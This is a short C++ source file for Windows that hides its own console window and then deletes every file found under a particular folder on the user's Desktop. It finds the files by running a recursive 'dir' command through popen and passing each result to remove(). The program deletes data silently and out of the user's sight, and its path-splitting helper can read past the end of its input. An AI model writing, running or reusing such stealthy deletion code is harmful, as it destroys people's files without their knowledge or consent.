#include <iostream>
#include <string>
#include <vector>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
using namespace std;


string exec(string command) {
   char buffer[1000];
   int i = 0;
   string* result = new string;
   string tempo = "";

   FILE* pipe = popen(command.c_str(), "r");
   if (!pipe) {
      return "popen failed!";
   }
   
   while (!feof(pipe)) {
      
      if (fgets(buffer, 1000, pipe) != NULL)
         tempo += buffer;
    
        i++;
   }

   pclose(pipe);
   return tempo;
}

void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void separate(string pathList, vector<string> *v){
	int i = 0;
	while (i < pathList.length()){
    	string temp = "";
	    while(pathList[i]!='\n'){
	    	temp += pathList[i];
	    	i++;
		}
		v->push_back(temp);
		i++;
	}
	
}

int main(){
	HideConsole();
	string user = getenv("USERPROFILE");
	string cmd = "dir " + user + "\\Desktop\\fuck /s /b /o:gn";
    string res = exec(cmd);
    vector<string> list;
    separate(res,&list);
    for (int i = 0;i<list.size();i++){
    	const char* l = list[i].c_str();
    	remove(l);
    }
    return 0;
}